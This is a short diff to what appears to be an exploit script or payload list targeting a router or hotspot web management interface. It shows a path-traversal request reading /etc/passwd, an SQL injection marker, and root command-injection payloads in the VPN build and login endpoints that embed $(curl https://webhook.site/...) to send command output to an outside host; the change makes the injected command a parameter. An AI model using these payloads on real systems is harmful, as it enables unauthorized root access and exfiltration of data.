@@ -31,7 +31,7 @@ dalladata=2022-10-07[SQLI]&alladata=2022-11-07&session=no&Cerca=Montrer
 GET /hotspot/include/ajax_download.php?path=../etc/passwd HTTP/1.1
 
 [Root RCE smart module]
-GET /smart/vpn/build.php?type=OVPN&conf_name=$(curl https://webhook.site/xx/$(id))&conf_file=hey
+GET /smart/vpn/build.php?type=OVPN&conf_name=$(curl https://webhook.site/xx/$('$3'))&conf_file=hey
 
 [Root RCE login]
 curl -sk -X POST $1/adm/auth/login/ -d 'action=login&user=$(curl %09https://webhook.site/'$2'/$(id))&pass=testtest&proto=&lang=en'
